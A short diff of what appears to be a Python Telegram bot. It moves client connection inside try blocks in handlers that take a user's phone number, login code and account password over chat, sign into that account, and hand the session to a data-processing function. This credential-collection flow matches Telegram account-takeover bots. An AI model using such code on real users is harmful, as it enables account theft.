@@ -96,9 +96,9 @@ async def get_code(message: types.Message):
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
     # Создаем новый экземпляр клиента
-    client = create_client()
-    await client.connect()
     try:
+        client = create_client()
+        await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
         await message.reply("Успешная авторизация!")
         await process_user_data(client, phone_number, message.from_user.id)
@@ -118,8 +118,9 @@ async def process_password(message: types.Message):
     password = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
-    await client.connect()
+    
     try:
+        await client.connect()
         #await client.sign_in(phone_number=phone_number, code=code, password=password, phone_code_hash=phone_code_hash.phone_code_hash)
         await client.sign_in(password=password)
         await message.reply("Успешная авторизация!")
